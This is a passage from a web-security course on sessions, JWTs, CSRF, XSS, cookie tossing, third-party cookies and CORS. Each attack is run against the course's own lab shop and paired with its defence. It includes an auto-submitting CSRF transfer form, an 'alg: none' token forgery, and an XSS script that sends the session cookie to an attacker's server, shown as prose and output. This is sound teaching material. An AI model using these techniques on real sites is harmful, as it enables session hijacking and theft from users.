- **The id comes from a CSPRNG and carries at least 128 bits.** Lab 04 section 01 makes 22 random base64url characters, which is 128 bits of randomness in a 26-byte `sid=...` field.  
  OWASP's guidance asks for at least 64 bits; 128 leaves no room for an online guess to succeed.  
  An id built from a counter, a timestamp or the user name can be predicted, and then guessing replaces stealing (Exercise 03).

- **The id means nothing.**  
  It encodes no user, no time, no role.  
  Everything about the session lives in the store. An id with meaning is a token, and needs the protections below.

- **A new id at login, and at every privilege change.**  
  The id the visitor had before logging in is destroyed and a new one issued.  
  This single rule defeats session fixation (10.04, Lab 04 part B).

- **Two timeouts, enforced on the server.**  
  An *idle* timeout ends a session after a stretch with no requests; an *absolute* timeout ends it a fixed time after login whatever the activity.  
  A cookie's `Max-Age` only asks the browser; it cannot be trusted to enforce either.  
  In Lab 04 the session is rejected an hour and a second after its creation.

- **Logout destroys the server record**, then clears the cookie for the benefit of the browser.  
  After logout the old id must fail, whatever the browser does (Lab 04 section 05: "session after logout: rejected").

- **Store a hash of the id, not the id.**  
  If the store leaks, hashes of random 128-bit ids cannot be turned back into working cookies.  
  The lab keeps ids in a map for brevity.

- **A lookup is the cost.**  
  In the lab it is a map lookup of a few tens of nanoseconds.  
  In a real deployment of several servers the store is a shared service (a database, Redis), so each request pays a network round trip to it,  
  and it becomes a dependency that must be available whenever the site is.  
  Sticky routing (H08) avoids the shared store at the price of uneven load and lost sessions on restart.

### The self-contained token

A token that carries its own claims has three parts joined by dots, each base64url-encoded (H01): a header that names the algorithm, a payload of **claims**, and the tag.  
This is the JWT (JSON Web Token) shape, signed with HS256, which means HMAC-SHA256. Lab 04 section 02 prints a real one:

```text
header:    {"alg":"HS256","typ":"JWT"}
payload:   {"sub":"alice","jti":"t-0001","iat":1793188800,"exp":1793192400}
signature: HMAC-SHA256 over "header.payload", 32 bytes
```

The claims are `sub` (subject, the user), `jti` (a unique id for this token), `iat` (issued at) and `exp` (expiry), the last two in Unix seconds.  
R10 covers the others (`iss`, `aud`, `nbf`, scopes) and the OAuth flows that issue them.

```mermaid
flowchart TD
    A["Token arrives in a cookie or an Authorization header"] --> B["Split into three parts at the dots"]
    B --> C{"Algorithm named in the header is the one the server pinned?"}
    C -- no --> X["Reject"]
    C -- yes --> D["Recompute HMAC over header.payload with the server key"]
    D --> E{"Equals the received tag, compared in constant time?"}
    E -- no --> X
    E -- yes --> F{"exp in the future, and any other checks pass?"}
    F -- no --> X
    F -- yes --> G["Accept: the claims are the identity"]
```

The properties and the traps, each shown in Lab 04:

- **The payload is encoded, not encrypted.**  
  Anyone holding the token can read the claims.  
  Do not put anything in it that the holder, or an attacker who steals it, must not read.

- **Changing the payload invalidates the tag.**  
  Lab 04 section 03: edit the payload to say `admin` and keep the old tag, cut the tag to 10 characters, or sign with another key, and all three are rejected.

- **The verifier must choose the algorithm, not the token.**  
  The header names an algorithm, and one valid value is `none`, meaning "no signature".  
  A verifier that obeys the header accepts a forged token with an empty tag.  
  Lab 04 section 04 forges `{"alg":"none"}` with the payload `sub: admin`: the naive verifier accepts it as `admin` and the pinned verifier rejects it.  
  A related trap is *algorithm confusion*, in which a server that verifies RS256 (public-key signatures, H12) tokens with a public key is tricked into verifying an HS256 token using that same public key as the HMAC secret.  
  Pinning one algorithm, and one key per algorithm, closes both.

- **Compare tags in constant time.**  
  A byte-by-byte comparison that returns at the first difference leaks, through timing, how many leading bytes of a guess were right.  
  The lab uses `MessageDigest.isEqual` in Java and `subtle` in Rust.

- **There is no logout.** The server holds nothing that says "this token was cancelled".  
  Lab 04 section 05: after logout the session is rejected, and the token is still accepted as `alice` until `exp`.  
  A **denylist** of cancelled `jti` values fixes that, and it is server state again: a store that every verification must consult, which is the cost the token was meant to avoid.  
  Short lifetimes (minutes) plus a server-held refresh credential bound the window.

- **Key rotation logs everyone out, unless planned.**  
  Lab 04 section 06: replace the key and every outstanding token is rejected.  
  Real tokens carry a key id (`kid`) so the verifier holds a small keyring and tries the right key, and an old key retires only after the tokens it signed have expired.

### The cost, measured

Lab 04 section 07 compares what each costs on this machine:

| Cost                                     | Server-side session                                                    | Signed token (HS256)                        |
| ---------------------------------------- | ---------------------------------------------------------------------- | ------------------------------------------- |
| `Cookie` field for one request           | 26 bytes (`sid=` + 22 characters)                                      | 173 bytes (`token=` + 167 characters)       |
| A page of 100 requests to the shop       | 2,600 bytes uploaded                                                   | 17,300 bytes uploaded                       |
| Server work per request                  | A map lookup, tens of nanoseconds (plus a network hop in a real store) | An HMAC check, about 1 to 4 µs (no network) |
| Server memory per user                   | A record in the store                                                  | None                                        |
| Works on any server with no shared store | No                                                                     | Yes                                         |
| Revocable before expiry                  | Instantly                                                              | No, without a denylist                      |

The timings differ between Java and Rust and between runs, so read them as orders of magnitude: both are cheap, and neither dominates a request's cost.  
The cookie size is exact and does not vary: the token is more than six times larger on every request.  
That is the cookie tax of 10.02 applied to a token. A token with a few extra claims doubles it again.

### Cookie or header: how the credential travels

Either credential can ride in a cookie or in an `Authorization` header (R4, R10).  
The transport changes the attack surface far more than the choice between the two credential types:

| Property                           | In a cookie                                                     | In an `Authorization` header set by script                   |
| ---------------------------------- | --------------------------------------------------------------- | ------------------------------------------------------------ |
| Attached by the browser on its own | Yes (ambient authority)                                         | No, the page's code adds it                                  |
| CSRF                               | Yes, unless `SameSite`, tokens or origin checks stop it (10.04) | No: a forged request from another site has no header         |
| Readable by XSS                    | No with `HttpOnly`; the script can still *use* it               | Yes if kept in `localStorage` or memory: it can be sent away |
| Cross-origin API calls             | Need `credentials: 'include'` and a CORS allowlist (10.06)      | Need a CORS preflight for the header (10.06)                 |
| Non-browser clients                | Awkward                                                         | Natural                                                      |
| Size                               | Sent on every request to the host, images included              | Sent only where the code adds it                             |

For a site that serves HTML to browsers, the usual answer is an opaque session id in a `__Host-` cookie with `HttpOnly`, `Secure` and `SameSite=Lax`, plus a CSRF defence.  
For a browser single-page application calling an API on another origin, teams use either the same cookie (with the CORS and CSRF care of 10.04 and 10.06) or short-lived tokens held in memory; R10 compares them.  
For service-to-service calls, a header token.  
A very common hybrid puts a signed token behind the cookie: the cookie carries a session id, and the services behind the gateway exchange it for a short-lived signed token (valid for minutes),  
which gives instant revocation at the edge and cheap verification inside.

### Interview angle

- *"JWT or session cookie for a web app?"* An opaque session id in an `HttpOnly` cookie: revocable, small, nothing readable by an attacker.  
  A JWT earns its place when many independent services must verify identity without calling a central store, and then it should be short-lived with a refresh credential held server-side.

- *"How do you log out a JWT user?"* You cannot, with the token alone.  
  Either keep a denylist of `jti`, which is the server state you hoped to avoid, or keep lifetimes so short that waiting for expiry is acceptable, and revoke the refresh credential.

- *"Where should an SPA store its token?"* In memory, or in an `HttpOnly` cookie so a script cannot read it.  
  In `localStorage` any XSS reads it and sends it away.  
  Whichever you choose, XSS can still use the session while the page is open (Lab 05 part B), so the defence against XSS is escaping and a CSP, not the storage choice.

- *"What does `alg: none` teach?"* That the verifier, not the token, decides how it is verified.  
  The same lesson covers the choice of key and the claims that must be present.

## 10.04 Attacks and the attribute that defends against each: fixation, CSRF, XSS, tossing

Cookies are ambient authority: the browser attaches them to every matching request, including requests that someone else's page caused.  
Four attacks follow from that. **Session fixation** has the attacker choose the victim's session id; the defence is a new id at login.  
**CSRF** has an attacker's page make the victim's browser send a request the victim never meant; the defences are `SameSite` (partly),  
a request that the attacker cannot forge (a secret token), and a check of the `Origin` or `Sec-Fetch-Site` field the browser adds.  

**XSS** runs attacker script on the victim's own page; `HttpOnly` stops it *stealing* the cookie and does nothing about it *using* the session,  
so the real fix is output escaping and a content security policy.  
**Cookie tossing** has a page on a sibling subdomain plant a cookie that the main site then trusts; the `__Host-` prefix stops it.  
No single attribute defends against all four.  
Each attack in this section is run against the lab shop in Chromium, with the defence on and off.

| Attack                           | `HttpOnly` | `Secure`  | `SameSite=Lax` | `SameSite=Strict` | `__Host-` prefix              | New id at login        | CSRF token, `Origin` check, or `Sec-Fetch-Site` check |
| -------------------------------- | ---------- | --------- | -------------- | ----------------- | ----------------------------- | ---------------------- | ----------------------------------------------------- |
| Cookie theft by XSS              | **stops**  | no        | no             | no                | no                            | no                     | no                                                    |
| Actions taken by XSS as the user | no         | no        | no             | no                | no                            | no                     | no (the script is same-origin and can read the token) |
| CSRF from another site           | no         | no        | partial        | **stops**         | no                            | no                     | **stops**                                             |
| CSRF from a sibling subdomain    | no         | no        | no             | no                | no                            | no                     | **stops**                                             |
| Session fixation                 | no         | no        | no             | no                | stops planting from a sibling | **stops**              | no                                                    |
| Cookie tossing                   | no         | partial   | no             | no                | **stops**                     | no (a lockout remains) | no                                                    |
| Sniffing on plain HTTP           | no         | **stops** | no             | no                | stops (implies `Secure`)      | no                     | no                                                    |

"Partial" for `Lax` against CSRF is Lab 05's finding: it blocks the cross-site `POST` and does not block the cross-site `GET`.  
"Partial" for `Secure` against tossing means that it stops an *insecure* page from overwriting the cookie and does not stop a sibling on HTTPS.

### Session fixation

**What happens.** The attacker visits the shop and receives an anonymous session id `A`.  
They then get `A` into the victim's browser (the paths are listed below).  
The victim logs in.  
If the shop keeps the id at login and just marks session `A` as belonging to alice, the attacker's `A` is now an authenticated session, and they walk in without ever learning a password.

```mermaid
sequenceDiagram
    participant A as Attacker
    participant S as Shop
    participant V as Victim browser
    A->>S: GET /
    S->>A: Set-Cookie sid=A (anonymous)
    A->>V: gets sid=A into the victim's jar
    V->>S: POST /login as alice, Cookie sid=A
    S->>S: bug: keep id A, mark it as alice
    S->>V: Set-Cookie sid=A (unchanged)
    A->>S: GET /account, Cookie sid=A
    S->>A: 200, alice's account
```

How the attacker gets `A` into the victim's jar: a link carrying the id in the URL (`?sid=A`, accepted by servers that read the id from the query), a script on a sibling subdomain that sets a `Domain` cookie (below), an XSS, or a network attacker on a plain-HTTP connection.  
Lab 04 part B runs the sequence with `curl` against two versions of the shop. With `fix=on` (the bug) the attacker holding only `A` gets `HTTP 200 alice, balance 1000`.  
With the default, the login response sets `sid=<B>`, a different value, and the same request ends `HTTP 401 not logged in`.

**Defence.**  
Issue a new id at login and discard the old one.  
Do the same after any privilege change (a step-up to a sensitive area, a role change).  
Never accept ids from the URL. A `__Host-` cookie name additionally stops the sibling-subdomain planting path.

### CSRF

**What happens.** The victim is logged in to the shop, so their jar holds a session cookie.  
On another site, the attacker's page contains a form aimed at the shop, which it submits by script:

```html
<form method="POST" action="http://shop.localhost:9400/transfer">
  <input name="to" value="mallory"><input name="amount" value="100">
</form>
<script>document.forms[0].submit()</script>
```

The browser sends a `POST` to the shop.  
The same-origin policy does not stop it, because sending is allowed (10.01).  
Whether the victim's cookie goes along is decided by `SameSite`.  
If it does, the shop sees an authenticated request that looks like the user's own and moves the money.  
The attacker never sees the answer and does not need to.

```mermaid
sequenceDiagram
    participant V as Victim browser
    participant E as evil.example.net
    participant S as shop.example.com
    V->>E: opens the attacker's page
    E->>V: page with an auto-submitting form aimed at the shop
    V->>S: POST /transfer, SameSite decides whether the session cookie is attached
    alt cookie attached
        S->>S: valid session, money moves
    else cookie withheld
        S->>V: 401, no session
    end
```

Lab 05 part A runs this for six server designs and four `SameSite` settings, from two kinds of attacker page, and reports whether the money moved (a victim, `alice`, and a thief, `mallory`):

```text
Part A1: from another site (evil.localhost)
endpoint (defence)         SameSite=none  SameSite=unset  SameSite=lax  SameSite=strict
transfer                   STOLEN         STOLEN          no cookie     no cookie
transfer-get               STOLEN         STOLEN          STOLEN        no cookie
transfer-token             rejected       rejected        no cookie     no cookie
transfer-origin            rejected       rejected        no cookie     no cookie
transfer-fetchmeta         rejected       rejected        no cookie     no cookie
transfer-json              preflight fails  (all four columns)

Part A2: from a sibling subdomain (blog.shop.localhost, same site)
transfer                   STOLEN in all four columns, Strict included
transfer-get               STOLEN in all four columns, Strict included
transfer-token / -origin / -fetchmeta   rejected in all four columns
transfer-json              preflight fails
```

The six endpoints are six defences. Reading the matrix:

01. **`transfer`: the cookie alone.** `STOLEN` under `None` and under *unset* (the cookie has no `SameSite` attribute, and the attacker's form was posted within 2 minutes of the login, the Lax+POST window of 10.02).  
  Blocked under `Lax` and `Strict`. `SameSite=Lax` already defeats the plain cross-site form `POST`.

02. **`transfer-get`: a state change on `GET`.** `STOLEN` even under `Lax`, because the cookie goes with a cross-site top-level navigation by `GET`.  
  Only `Strict` stops it. This is the reason never to change state on `GET` (R2.3): a `GET` is a link, and `Lax` was designed to let links carry the cookie.

03. **`transfer-token`: a CSRF token in the form.** The page's HTML includes a hidden field with a secret value tied to the session; the server requires it.  
  The attacker's page cannot read the shop's HTML (the same-origin policy) and so cannot supply the token: `rejected`, even when the cookie is attached.

04. **`transfer-origin`: check `Origin`.** The server requires `Origin` to equal the shop's own origin.  
  The browser sets `Origin` on cross-origin form posts and a page cannot change it: `rejected`.

05. **`transfer-fetchmeta`: check `Sec-Fetch-Site`.** The server requires `same-origin`.  
  The same logic, in a field that browsers send on every request and that also covers `GET`: `rejected`.

06. **`transfer-json`: demand `Content-Type: application/json`.**  
  A form cannot send that type, and a `fetch` that does so cross-origin triggers a preflight (10.06), which the shop never approves.  
  The attacker's request is never sent (`preflight fails`).  
  This works only while the server really rejects every other content type and does not configure CORS loosely.

**Part A2 is the important one.**  
The attacker's page runs on `blog.shop.localhost`, a sibling of the shop.  
It is the *same site*, so `SameSite` has nothing to say: `transfer` and `transfer-get` are `STOLEN` under all four settings, `Strict` included.  
Only the three server-side checks (a token, `Origin`, `Sec-Fetch-Site`) still reject, because they compare the *origin*, which differs. `SameSite` is a defence against other sites.  
Whatever shares your registrable domain, a blog, a user-content host, a forgotten staging server, is inside it.  
Treat `SameSite` as one layer and keep an origin-based check beneath it.

**What the defences cost and what they miss.**

| Defence                           | Where it works                                                                          | Where it breaks                                                                                    |
| --------------------------------- | --------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------- |
| `SameSite=Lax` or `Strict`        | Browsers that apply it. Free                                                            | Same-site attackers. State changes on `GET` (Lax). Browsers that do not default it (10.02)         |
| CSRF token (synchronizer)         | Every browser. The server stores a token per session                                    | XSS reads it. A forgotten form. A token tied to nothing (the same for everyone) defends nothing    |
| Double-submit cookie              | No server state: the token is in a cookie and in the form, and the server compares them | A sibling subdomain can plant the cookie (tossing), so sign the token or use `__Host-`             |
| `Origin` / `Sec-Fetch-Site` check | Browsers (Fetch Metadata is in all current engines). Cheap, no state                    | Non-browser clients send anything. Requests with neither field must be handled by an explicit rule |
| JSON-only endpoint                | Browser cross-origin requests                                                           | A server that also accepts `text/plain` bodies parsed as JSON. Loose CORS                          |

A sound design layers them: `SameSite=Lax` on the session cookie, a rule that state changes use `POST`, `PUT` or `DELETE`, and an `Origin` or `Sec-Fetch-Site` check on those, with a token for browsers that send neither.  
**Login CSRF**, in which the attacker's page logs the victim *in as the attacker* so that the victim then enters data into the attacker's account, is the same attack against the login form and is stopped by the same checks.

### XSS: stealing the cookie, and using the session

**What happens.** The shop's `/search` page copies the query into the HTML without escaping it, so the attacker's link can put a `<script>` of their choice into the shop's page, running as the shop.  
The script can read `document.cookie` and send it away, and it can call the shop's own endpoints.

Lab 05 part B injects a script that does both: it reads `document.cookie` and sends it to the attacker's server, and it posts a transfer.  
The result, with the session cookie first without `HttpOnly` and then with it:

```text
HttpOnly off  the attacker's server received:  c=sid=<id>
              the injected script's own transfer:    EXECUTED as alice   mallory's balance: 50
HttpOnly on   the attacker's server received:  c=
              the injected script's own transfer:    EXECUTED as alice   mallory's balance: 50
```

**What `HttpOnly` did.**  
Without it the attacker's server received the session id and can use it from anywhere, at any time, until the session ends.  
With it the cookie string was empty.  
The attacker lost the portable credential.

**What it did not do.**  
The script's own `fetch('/transfer')` ran in both cases and moved the money as alice, because the browser attaches the cookie to a request from a script just as it does to the user's own click.  
The attacker works through the victim's browser while the tab is open. `SameSite` does not help: the request is same-origin.  
Tokens do not help: the script reads the page and finds the token.  
This is why `HttpOnly` is worth setting and is not a defence against XSS: it turns "the attacker has your session forever" into "the attacker has your session while you browse".  
The remedies for the XSS itself are escaping every piece of untrusted text on output, a **content security policy** (a response header that tells the browser which scripts may run), and treating input handling as a source of vulnerabilities and not a convenience.

### Cookie tossing and sibling subdomains

**What happens.** A cookie with a `Domain` attribute is stored for the domain and sent to all its subdomains, and *any* subdomain may set one (10.02).  
A page on `blog.shop.localhost`, which the shop does not control, can set a cookie named `sid` with `Domain=shop.localhost; Path=/`.  
The cookie goes to the shop in every request, next to the shop's own.  
Two cookies with the same name arrive in one `Cookie` field, and the server takes the first one, which is the older, in this case the attacker's.

Lab 05 part C runs it three ways.  
The attacker first obtains a session `A`, plants `sid=A` for the whole site from the blog, and then the victim logs in:

```text
the shop rotates the id at login (correct)
   victim's browser holds:  sid (.shop.localhost), sid (shop.localhost)
   victim logs in as alice; /account shows: HTTP 401, not logged in
   attacker, holding only <A>, asks /account: HTTP 401
the shop keeps the id at login (fixation bug)
   victim logs in as alice; /account shows: alice
   attacker, holding only <A>, asks /account: alice
the shop rotates the id, cookie named __Host-sid
   planted by the sibling page: __Host-sid=<A>; Domain=shop.localhost; Secure; Path=/
   victim's browser holds:  __Host-sid (shop.localhost)
   victim logs in as alice; /account shows: alice
   attacker, holding only <A>, asks /account: HTTP 401
```

Case 1 is fixation foiled and the user still locked out: after the correct rotation the victim has two `sid` cookies, the server reads the planted one first,  
finds an anonymous session that has been discarded, and answers 401 until the user clears their cookies.  

It is a denial of service. Case 2 is fixation succeeding.  
Case 3 shows the prefix at work: the browser refuses to store the planted cookie because it has a `Domain`, so there is nothing to read first, and the real login works.  
A prefix does not protect against a cookie of a *different* name that the server happens to read, nor does it stop the sibling from sending same-site requests (the A2 matrix above).

**The structural answer** is to keep untrusted content off your registrable domain: user uploads, comments with HTML, customer sites live on a different registrable domain (`example-usercontent.net`), as large sites do, and are never given `Domain` cookies for the main one.  
HSTS with `includeSubDomains` (H16) keeps every subdomain on HTTPS.

### Interview angle

- *"Does `SameSite=Lax` make CSRF tokens unnecessary?"*  
  No.  
  It leaves top-level `GET`, it does not cover a same-site attacker (any sibling subdomain), and it depends on the browser applying it.  
  Keep a token or an `Origin` or `Sec-Fetch-Site` check on every state-changing request.

- *"How does `HttpOnly` relate to XSS?"*  
  It hides the cookie from scripts, so XSS cannot copy the session out, but the injected script still acts as the user through the browser.  
  It limits damage; escaping and CSP prevent the attack.

- *"What is session fixation and how do you stop it?"*  
  The attacker fixes the victim's session id before login.  
  A new id at login stops it; so does not taking ids from the URL; so does `__Host-` against the subdomain route.

- *"Why does a state change on `GET` break CSRF protection?"*  
  Because `Lax` cookies ride on top-level `GET` navigations, and a link or image-triggered `GET` is forgeable by anyone. Use `POST`, `PUT`, `DELETE` for changes.

- *"What does a CSRF token have to be?"*  
  Unpredictable, tied to the session (or signed with it), unreadable by another origin, and checked on the server for every state-changing request.

---

## 10.05 Third-party cookies and where they stand

A **third-party cookie** is a cookie set or sent when the request belongs to a different site than the page in the address bar: a widget, an ad or an analytics script embedded in someone else's page.  
The same cookie, with the same value, is seen by the embedding company on every site that includes it, which lets it follow a person across the web.  
That is the purpose of the mechanism and the reason browsers restrict it.  

State on 2026-10-28: Safari blocks third-party cookies; Firefox partitions them so that each embedding site gets its own copy; Chrome still allows them by default,  
after Google abandoned its plan to deprecate them and retired its Privacy Sandbox replacements in October 2025, and blocks them in Incognito and for users who switch the setting on.  
The partitioning mechanism, CHIPS (`Partitioned`), is the supported way for an embed to keep per-site state. Lab 06 shows both Chromium modes.  
This topic changes yearly and is tagged AWARE: treat the table below as a dated snapshot and re-check it before relying on it.

| Browser | Third-party cookies by default                                                                                                                                                         | Source of the statement                                                                                          |
| ------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------- |
| Safari  | Blocked (Intelligent Tracking Prevention, all third-party cookies blocked since 2020)                                                                                                  | Vendor announcements. Not re-tested in this lab                                                                  |
| Firefox | Partitioned per top-level site (Total Cookie Protection, the default since 2022)                                                                                                       | Vendor announcements. Not re-tested in this lab                                                                  |
| Chrome  | Allowed. Blocked in Incognito and when the user chooses it. The deprecation plan was dropped in 2024, confirmed in April 2025, and the Privacy Sandbox APIs were retired on 2025-10-18 | Press reports of Google's announcements (Engadget, OS News, 2025). Lab 06 verifies the behaviour of Chromium 153 |

The two Chromium modes are what Lab 06 measures, because they are what a developer can reproduce.

### What an embed sees, with and without blocking

The shop (`shop.localhost`) is embedded in an `<iframe>` on two other sites, `evil.localhost` and `other.localhost`.  
Three cookies are in play, all `SameSite=None; Secure` so that `SameSite` does not interfere: `fp`, set during a first-party visit to the shop;  
`wu`, set by the shop from *inside* the iframe, unpartitioned; `wp`, set from inside the iframe with `Partitioned`.  
Each row lists the cookies the shop received:

```text
Chromium defaults (153)                                 cookies sent
iframe on evil.localhost, the shop sets wu and wp       [fp]
iframe on evil.localhost, second load                   [fp, wu, wp]
iframe on other.localhost                               [fp, wu]
the shop opened directly (first party)                  [fp, wu]
the browser holds: fp, wu, wp (partition http://evil.localhost)

third-party cookie blocking ON                          cookies sent
iframe on evil.localhost, the shop sets wu and wp       []
iframe on evil.localhost, second load                   [wp]
iframe on other.localhost                               []
the shop opened directly (first party)                  [fp]
the browser holds: fp, wp (partition http://evil.localhost)
```

Reading it:

- **By default, `wu` is the tracker.** The shop gets `wu` in the iframe on `evil.localhost`, in the iframe on `other.localhost` and when opened directly.  
  The same value follows the user across sites, so the shop can recognise them on each. `fp` also goes along into the embeds, for the same reason.

- **`wp` is isolated.** It reaches the shop in the iframe on `evil.localhost` and nowhere else, and the browser reports its **partition**: `http://evil.localhost`.  
  The cookie's identity is the pair (top-level site, cookie host), so the copy of `wp` the shop holds for `evil.localhost` is a different cookie from the one it would hold for `other.localhost`.  
  The shop learns a per-site state and cannot join the two.

- **With blocking on, only `wp` survives** and only in the partition that created it.  
  `wu` was never stored (the first row shows `[]`), `fp` is withheld from the embed (the shop sees it only when it is the page in the address bar), and the iframe on `other.localhost` receives nothing.

```mermaid
flowchart TD
    A["Request from an iframe on a page at top-level site T to an embedded host H"] --> B{"Third-party cookie blocking on?"}
    B -- no --> C["Unpartitioned cookies of H: sent if SameSite=None and Secure. Partitioned cookies: sent from partition T only"]
    B -- yes --> D["Unpartitioned cookies of H: not stored, not sent"]
    D --> E["Partitioned cookies of H: sent from partition T only"]
    E --> F["Storage Access API: the iframe asks for its unpartitioned cookies, the browser may prompt the user"]
```

### The tools an embed has

- **CHIPS, `Partitioned`.** Add `Partitioned` to the cookie (with `Secure` and normally `SameSite=None`) when the embed needs its own memory on each embedding site: a chat widget that remembers the conversation, a payment frame that remembers a draft.  
  The cost is that state does not follow the user from site to site, which is the point.

- **Storage Access API.** An embedded document calls `document.requestStorageAccess()`, normally after a user gesture, to ask for access to its unpartitioned cookies on this site.  
  The browser may show a prompt or decide from context.  
  Meant for cases such as an embedded document editor that needs the user's real login.

- **Top-level flows instead of hidden frames.**  
  Single sign-on that depended on a third-party cookie inside an iframe (checking "am I logged in at the identity provider?") moves to a redirect-based flow (the OpenID Connect and OAuth authorisation code flow, R10) or to browser-mediated login.  
  A redirect is a top-level navigation, so the identity provider's cookie is first-party.

- **First-party analytics.** Counting visitors needs a cookie on *your* site, not a third party's.

### A checklist for the work this implies

01. List every cookie your service sets or reads inside someone else's page. DevTools, Application, Cookies, shows a *Partition Key* column for partitioned ones.

02. Decide for each: does it need state per embedding site (use `Partitioned`), cross-site identity (use the Storage Access API or a redirect flow), or neither (stop using a cookie).

03. Test with blocking on. In Chrome, the setting "Block third-party cookies", or an Incognito window.  
  In automation, Chromium's DevTools protocol command `Network.setCookieControls`, which Lab 06 uses.

04. Do not rely on a browser's current default for the product's correctness: they have changed repeatedly and differ across engines.

### Interview angle

- *"What is the difference between first-party and third-party cookies?"*  
  Whether the cookie's site matches the top-level page's site at the time of the request.  
  The same cookie is first-party when the user visits that site and third-party when it rides on an embed in another site's page.

- *"What is CHIPS?"*  
  Cookies Having Independent Partitioned State: a `Partitioned` cookie is keyed by the embedding top-level site as well as its host, so an embed keeps per-site state and cannot be used to track across sites.

- *"What happens to your embedded widget when third-party cookies are blocked?"*  
  Its unpartitioned cookies stop working. Partition them, ask for storage access, or move the flow to the top level.  
  Verify in a browser with blocking on.

---

## 10.06 CORS in one page: preflight and credentialed requests

CORS is a way for a server to allow pages from other origins to *read* its responses.  
The browser enforces it, and only for scripts.  
It does not stop requests: a **simple** cross-origin request is sent immediately, with its cookies if `SameSite` allows, and the browser decides afterwards whether the script may see the answer,  
according to the response's `Access-Control-Allow-Origin` field.  

Any request that is not simple, such as a `PUT`, a custom header, an `Authorization` header or a JSON body, is held while the browser sends a **preflight**: an `OPTIONS` request, with no cookies, that asks whether the real request would be allowed.  
Only if the preflight is approved does the real request go out.  
Two rules matter above all.  
A request with cookies (`credentials: 'include'`) needs the server to name the *exact* requesting origin and send `Access-Control-Allow-Credentials: true`; the wildcard `*` is refused.  
And CORS is no protection for the server: it is neither authentication nor a CSRF defence, because the write has already happened on the server by the time the browser hides the answer.  

Lab 07 runs nine server policies against four request kinds and prints the browser's own messages.

### Simple and non-simple requests

A cross-origin request is **simple** if all of these hold:

- The method is `GET`, `HEAD` or `POST`.

- The only request fields the page script sets are those on the browser's CORS-safelist: `Accept`, `Accept-Language`, `Content-Language`, `Content-Type` and a plain `Range`.

- If `Content-Type` is set, it is `application/x-www-form-urlencoded`, `multipart/form-data` or `text/plain`.  
  These are the three types a plain HTML form can send, which is why the rule exists: a simple request is something a page could already do without scripts.

Anything else triggers a preflight: methods `PUT`, `PATCH`, `DELETE`; a header such as `Authorization`, `X-Request-Id` or a `traceparent`; `Content-Type: application/json`.  
The lab's four request kinds were chosen to cover both sides:

| Kind of request                      | Simple? | What the browser does                                                                            |
| ------------------------------------ | ------- | ------------------------------------------------------------------------------------------------ |
| `GET`, no cookies                    | yes     | Sends it, then checks `Access-Control-Allow-Origin`                                              |
| `GET` with cookies                   | yes     | Sends it with cookies (if `SameSite` allows), then checks `Allow-Origin` and `Allow-Credentials` |
| `PUT` with a JSON body and cookies   | no      | Sends a preflight first. Sends the `PUT` only if the preflight is approved                       |
| `POST` with `text/plain` and cookies | yes     | Sends it at once, **even though it writes**                                                      |

### The preflight

```mermaid
sequenceDiagram
    participant P as Page on app.shop.example.com
    participant B as Browser
    participant A as api.shop.example.com
    P->>B: fetch PUT with JSON body, credentials include
    B->>A: OPTIONS, Origin app.shop, Access-Control-Request-Method PUT, Access-Control-Request-Headers content-type. No cookies
    A->>B: 204, Access-Control-Allow-Origin app.shop, Allow-Credentials true, Allow-Methods, Allow-Headers, Max-Age 600
    Note over B: checks the answer against the planned request
    B->>A: PUT with JSON body and cookies, Origin app.shop
    A->>B: 200, Access-Control-Allow-Origin app.shop, Allow-Credentials true
    B->>P: response handed to the script
```

The fields of both sides:

| Field                                      | Direction          | Meaning                                                                                                          |
| ------------------------------------------ | ------------------ | ---------------------------------------------------------------------------------------------------------------- |
| `Origin`                                   | request            | The page's origin, added by the browser                                                                          |
| `Access-Control-Request-Method`            | preflight          | The method the real request will use                                                                             |
| `Access-Control-Request-Headers`           | preflight          | The non-safelisted fields the real request will carry                                                            |
| `Access-Control-Allow-Origin`              | response           | `*` or one exact origin. The page may read the response if it matches                                            |
| `Access-Control-Allow-Credentials`         | response           | `true` if the page may send and read with cookies. Needs an exact origin, not `*`                                |
| `Access-Control-Allow-Methods`, `-Headers` | preflight response | What the server permits                                                                                          |
| `Access-Control-Max-Age`                   | preflight response | Seconds the browser may remember this approval. Browsers cap it (Chromium: two hours)                            |
| `Access-Control-Expose-Headers`            | response           | Extra response fields the script may read                                                                        |
| `Vary: Origin`                             | response           | Needed whenever `Allow-Origin` depends on `Origin`, so a cache never serves one origin's answer to another (H09) |

Lab 07 part C measures two of them.  
Three `PUT`s in a row with `Access-Control-Max-Age: 600` produced **1 preflight and 3 `PUT`s**: the approval was remembered.  
And `response.headers.get('X-Request-Id')` gave `null` when the server did not send `Access-Control-Expose-Headers` and `r-5` when it did:  
a script may read only the CORS-safelisted response fields (`Cache-Control`, `Content-Language`, `Content-Length`, `Content-Type`, `Expires`, `Last-Modified`, `Pragma`) unless the server exposes others.

### Credentials

By default a cross-origin `fetch` carries no cookies.  
The page opts in with `credentials: 'include'`, and then **both** sides must agree: the response needs `Access-Control-Allow-Credentials: true` and an `Access-Control-Allow-Origin` that names the exact origin.  
Lab 07 shows the browser's refusal when the server tries `*` with credentials:

```text
cors=starcreds, GET+cookies, page on evil.localhost:
   ... has been blocked by CORS policy: The value of the 'Access-Control-Allow-Origin' header in the
   response must not be the wildcard '*' when the request's credentials mode is 'include'.
```

The cookie rules of 10.02 still apply on top: a cookie that `SameSite` withholds is not sent however friendly the CORS policy.  
The lab sets the victim's cookie to `SameSite=None; Domain=shop.localhost` on purpose so that CORS is the only thing that decides what a page can read.

### Nine server policies, measured

Lab 07 part A sends four kinds of request from pages on three origins (`app.shop.localhost` the legitimate one, `evil.localhost`, `evil-shop.localhost`) to `api.shop.localhost` under each policy, with a victim, `alice`, logged in.  
A cell says what the page's script obtained: `read(user)` if it could read the answer, `blocked` if the browser refused it, and `*` if the server executed a write anyway.  
Distilled:

| Policy `cors=` | What the server sends                                                                                 | Verdict, from the lab                                                                  |
| -------------- | ----------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------- |
| `none`         | No CORS fields at all                                                                                 | Nobody can read, cookies or not. But the `text/plain` `POST` **executed** (`blocked*`) |
| `star`         | `Allow-Origin: *`                                                                                     | Anyone reads public data (`read(null)`), never with cookies (`blocked`)                |
| `echo`         | `Allow-Origin` = the request's `Origin`, no `Vary`                                                    | Same as `*` for requests without cookies, and a caching hazard: no `Vary: Origin`      |
